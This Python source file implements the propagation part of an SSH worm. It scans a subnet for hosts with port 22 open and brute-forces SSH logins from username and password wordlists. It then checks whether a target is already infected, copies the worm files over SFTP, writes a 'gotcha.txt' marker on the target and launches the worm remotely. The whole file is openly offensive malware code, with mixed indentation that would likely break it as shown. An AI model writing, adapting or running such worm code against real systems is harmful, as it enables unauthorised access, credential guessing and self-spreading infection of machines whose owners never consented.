import paramiko
import nmap
import socket
import os, sys

class SSHConnection:
    """ Creates an SSHConnection class. """
    def __init__(self):
        """ Initializer. Possibly add exception handling later, or just trust user """
        self.password = None
        self.username = None
        self.vulnerable_hosts = []
        self.target_host = None
        self.worm_file = None
        self.password_file = None
        self.username_file = None
        self.ssh_connection = paramiko.SSHClient()
        self.ssh_connection.set_missing_host_key_policy(paramiko.AutoAddPolicy())
	self.files = []
	self.class_file = "SSHConnection.py"
	self.target_dir = ""
	self.host_dir = ""

    def set_files(self, list_of_files):
	self.files = list_of_files
	self.worm_file = list_of_files[0]
	self.class_file = "SSHConnection.py"
	self.password_file = list_of_files[1]
	self.username_file = list_of_files[2]
	self.files.append(self.class_file) 

    def set_password(self, password):
        self.password = password
   
    def set_username(self, username):
        self.username = username

    def set_hosts(self, new_hosts):
        self.vulnerable_hosts = new_hosts

    def set_target(self, host):
        self.target_host = host

    def set_worm_file(self, file_name):
        self.worm_file = file_name

    def set_password_file(self, file_name):
        self.password_file = file_name

    def set_username_file(self, file_name):
        self.username_file = file_name

    def set_target_dir(self, target_dir):
	self.target_dir = target_dir

    def set_host_dir(self, host_dir):
	self.host_dir = host_dir

    def get_local_ip(self):
        """ Gets current machine's ip """
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.connect(('8.8.8.8', 1))
        local_ip = sock.getsockname()[0]
        sock.close()
        return local_ip

    def retrieve_vulnerable_hosts(self, start_ip, max_ip):
        """ Retrieve list of hosts to attack, removes local computer """
	print ("[+] Getting vulnerable hosts")
	port = 22
	hosts = [start_ip + str(i) for i in range(0, max_ip)] 
	live_hosts = []
        local_host = self.get_local_ip()
	for host in hosts:
	    if host == local_host:
                continue
            try:
	        ssh_sock = socket.socket()
	        ssh_sock.settimeout(20)
	        port_status = ssh_sock.connect_ex((host,port))
                if port_status == 0:
	    	    live_hosts.append(host)
		    print ("    [-] Added: %s" % (host))
	    except Exception as e:
		pass
	    finally:
		ssh_sock.close()

        """ Remove local host from list of target IPs """
        try:
            live_hosts.remove(local_host)
        except ValueError:
            pass
	self.vulnerable_hosts = live_hosts
	return

    def get_usernames_and_passwords(self):
        """ Returns list of strings for usernames and passwords files """
        with open(self.host_dir + self.username_file, 'r') as unames:
	    usernames = unames.readlines()
        with open(self.host_dir + self.password_file, 'r') as passwds:
            passwords = passwds.readlines()
	usernames = [username.strip() for username in usernames]
        passwords = [password.strip() for password in passwords]
        return (usernames, passwords)
	

    def brute_force_host(self, target_host, usernames, passwords):
        """ Brute forces all a host. Returns true on success """
	print ("[+] Attacking %s " % (target_host))
	for user in usernames:
            for passwd in passwords:
		print ("    [-] username: " + user + ", password: " + passwd)
		try:
                    self.ssh_connection.connect(target_host, username=user, password=passwd)
                    self.set_target(target_host)
                    self.set_username(user)
                    self.set_password(passwd)
                    print("        Credentials found! " + user + ", " + passwd)
                    return True
                except paramiko.AuthenticationException as e:
                    self.ssh_connection.close()
		    continue
		except paramiko.ssh_exception.SSHException as e:
                    self.ssh_connection.close()
		    break
		except Exception as e:
		   continue
        return False

    def find_target_host(self):
        usernames, passwords = self.get_usernames_and_passwords()
	for host in self.vulnerable_hosts:
            if self.brute_force_host(host, usernames, passwords):
                if self.check_if_marked():
		    print ("[+] Infecting %s" % (host))
		    return host
		else: 
		    self.ssh_connection.close()
	""" No host found """
	print ("No host could be connected to")
	return None

    def check_if_marked(self):
        stdin, stdout, stderr = self.ssh_connection.exec_command("ls " + self.target_dir)
        results = stdout.readlines()
        results = [str(name) for name in results]
        results = [name[0:-1] for name in results]
        return not self.worm_file in results

    def place_worm(self):
	sftp_client = self.ssh_connection.open_sftp()
        for file_name in self.files:
	    host_side = self.host_dir + file_name
	    target_side = self.target_dir + file_name
	    sftp_client.put(host_side, target_side)
 
    def start_attack(self):
	print ("[+] Starting attack on " + self.target_host)
	marker = self.get_local_ip()
	""" Marks which system the target got the worm from """
	self.ssh_connection.exec_command("echo " + marker + " >> gotcha.txt")
        """ Start the attack """
	self.ssh_connection.exec_command("python " + self.target_dir + self.worm_file + 
		" " + self.username_file + " " + self.password_file)
